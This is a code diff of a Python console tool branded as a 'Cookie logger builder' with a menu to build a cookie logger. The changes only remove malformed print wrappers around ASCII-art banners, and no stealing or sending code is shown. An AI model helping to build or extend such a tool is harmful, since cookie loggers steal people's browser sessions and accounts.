@@ -37,7 +37,6 @@ def builder():
     print("[+] check dist folder.")
 
 def options():
-    print( + """
         ________  _________                       __   
        / ____/  |/  / ____/___  ____  _________  / /__ 
       / /   / /|_/ / /   / __ \/ __ \/ ___/ __ \/ / _ |
@@ -46,7 +45,6 @@ def options():
                                                                                                                     
     Cookie logger builder      Enpowering Eradication
         
-    """ +)
     print("Cookie Monster Console is in beta so options and payloads may be limited.")
     print("""
     [1] build a cookie logger
@@ -67,7 +65,6 @@ def options():
         logo()
 
 def logo():
-    print(+ """
         ________  _________                       __   
        / ____/  |/  / ____/___  ____  _________  / /__ 
       / /   / /|_/ / /   / __ \/ __ \/ ___/ __ \/ / _ |
@@ -76,7 +73,6 @@ def logo():
                                                                                                                     
     Cookie logger builder      Enpowering Eradication
         
-    """ +)
     builder()
 
 if ctypes.windll.shell32.IsUserAnAdmin():
